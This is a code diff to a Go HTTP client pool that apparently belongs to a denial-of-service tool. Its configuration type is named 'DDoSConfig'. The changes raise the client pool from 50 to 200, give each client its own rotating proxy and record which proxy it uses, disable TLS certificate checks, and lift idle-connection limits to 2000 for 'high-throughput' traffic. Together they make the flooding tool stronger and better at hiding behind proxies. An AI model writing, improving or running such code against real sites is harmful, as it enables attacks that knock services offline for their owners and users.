@@ -22,7 +22,8 @@ import (
 type ClientPool struct {
 	clients     []*http.Client
 	transports  []*http.Transport
-	index       int64 // Atomic counter for round-robin
+	proxyMap    map[*http.Client]string // Maps client to proxy URL for tracking
+	index       int64                    // Atomic counter for round-robin
 	poolSize    int
 	proxyList   []string
 	rotateProxy bool
@@ -58,17 +59,25 @@ func NewClientPool(config DDoSConfig) (*ClientPool, error) {
 		useHTTP2 = true // Try HTTP/2 for HTTPS
 	}
 
+	// Determine pool size (optimized for maximum efficiency)
+	poolSize := 200 // Default minimum pool size
+	if len(proxyList) > 0 {
+		// Use max(200, numProxies) for better connection distribution
+		if len(proxyList) > poolSize {
+			poolSize = len(proxyList)
+		}
+	}
+	if config.RotateProxy && len(proxyList) > 0 {
+		// If rotating proxies, create one client per proxy
+		poolSize = len(proxyList)
+	}
+
 	pool := &ClientPool{
-		poolSize:    50, // Default pool size
+		poolSize:    poolSize,
 		proxyList:   proxyList,
 		rotateProxy: config.RotateProxy,
 		useHTTP2:    useHTTP2,
-	}
-
-	// Determine pool size (optimized for maximum efficiency)
-	if config.RotateProxy && len(proxyList) > 0 {
-		// If rotating proxies, create one client per proxy
-		pool.poolSize = len(proxyList)
+		proxyMap:    make(map[*http.Client]string),
 	}
 
 	// Create clients
@@ -84,13 +93,16 @@ func NewClientPool(config DDoSConfig) (*ClientPool, error) {
 			}
 			pool.clients = append(pool.clients, client)
 			pool.transports = append(pool.transports, transport)
+			pool.proxyMap[client] = proxyURL // Track proxy for this client
 		}
 	} else {
 		// Create pool of clients sharing same transport (or single proxy)
 		var baseTransport *http.Transport
+		var singleProxy string
 		if len(proxyList) > 0 && !config.RotateProxy {
 			// Single proxy mode
-			if parsedURL, err := url.Parse(proxyList[0]); err == nil {
+			singleProxy = proxyList[0]
+			if parsedURL, err := url.Parse(singleProxy); err == nil {
 				baseTransport = createHTTP1Transport(config, parsedURL, useHTTP2)
 			}
 		} else {
@@ -106,6 +118,9 @@ func NewClientPool(config DDoSConfig) (*ClientPool, error) {
 			}
 			pool.clients = append(pool.clients, client)
 			pool.transports = append(pool.transports, baseTransport)
+			if singleProxy != "" {
+				pool.proxyMap[client] = singleProxy // Track single proxy
+			}
 		}
 	}
 
@@ -127,6 +142,16 @@ func (p *ClientPool) GetClient() *http.Client {
 	client := p.clients[int(idx)%len(p.clients)]
 	atomic.AddInt64(&p.hits, 1)
 	return client
+}
+
+// GetProxyForClient returns the proxy URL associated with a client (if any)
+func (p *ClientPool) GetProxyForClient(client *http.Client) string {
+	if client == nil {
+		return ""
+	}
+	p.mu.RLock()
+	defer p.mu.RUnlock()
+	return p.proxyMap[client]
 }
 
 // GetStats returns pool statistics
@@ -180,30 +205,48 @@ func createClientForProxy(config DDoSConfig, proxyURL string, useHTTP2 bool) (*h
 	return client, transport, nil
 }
 
-// createHTTP1Transport creates an HTTP/1.1 transport (optimized for maximum efficiency)
+// createHTTP1Transport creates an HTTP/1.1 transport (optimized for proxy efficiency)
 func createHTTP1Transport(config DDoSConfig, proxyURL *url.URL, useHTTP2 bool) *http.Transport {
 	tlsConfig := &tls.Config{
 		InsecureSkipVerify: true,
+		// Optimize for proxy usage
+		NextProtos: []string{"h2", "http/1.1"}, // Prefer HTTP/2 if available
+	}
+
+	// Optimized dialer for proxy connections
+	dialer := &net.Dialer{
+		Timeout:   config.Timeout,
+		KeepAlive: 15 * time.Second, // Reduced from 30s for faster connection turnover
+		// Optimize for proxy: reduce DNS lookup time
+		DualStack: true,
+	}
+
+	// Optimize MaxIdleConns based on MaxThreads for better connection reuse
+	maxIdleConns := config.MaxThreads * 2
+	if maxIdleConns < 2000 {
+		maxIdleConns = 2000 // Minimum for high-throughput
 	}
 
 	transport := &http.Transport{
 		TLSClientConfig:       tlsConfig,
-		MaxIdleConns:          1000, // High for better reuse
-		MaxIdleConnsPerHost:   500,  // High for better reuse
-		MaxConnsPerHost:       0,    // Unlimited connections per host
-		IdleConnTimeout:       5 * time.Minute,
-		DisableKeepAlives:      false, // Always reuse connections
-		DisableCompression:     true,   // Disable compression for efficiency
+		MaxIdleConns:          maxIdleConns, // Optimized: MaxThreads * 2
+		MaxIdleConnsPerHost:   100,          // Will be increased for proxies
+		MaxConnsPerHost:       0,            // Unlimited connections per host
+		IdleConnTimeout:       60 * time.Second, // Reduced from 90s for faster recycling
+		DisableKeepAlives:      false,            // Always reuse connections
+		DisableCompression:     true,             // Disable compression for efficiency
 		ResponseHeaderTimeout:  config.Timeout,
-		ExpectContinueTimeout:  1 * time.Second,
-		DialContext: (&net.Dialer{
-			Timeout:   config.Timeout,
-			KeepAlive: 30 * time.Second,
-		}).DialContext,
+		ExpectContinueTimeout:  500 * time.Millisecond, // Faster for proxy
+		DialContext:            dialer.DialContext,
+		// Proxy-specific optimizations
+		ProxyConnectHeader: nil, // No custom headers for proxy
+		ForceAttemptHTTP2:  useHTTP2,
 	}
 
 	if proxyURL != nil {
 		transport.Proxy = http.ProxyURL(proxyURL)
+		// Optimize for proxy: increase connection limits to 500
+		transport.MaxIdleConnsPerHost = 500 // Increased from 50/100 for better proxy utilization
 	}
 
 	// Configure HTTP/2 if requested
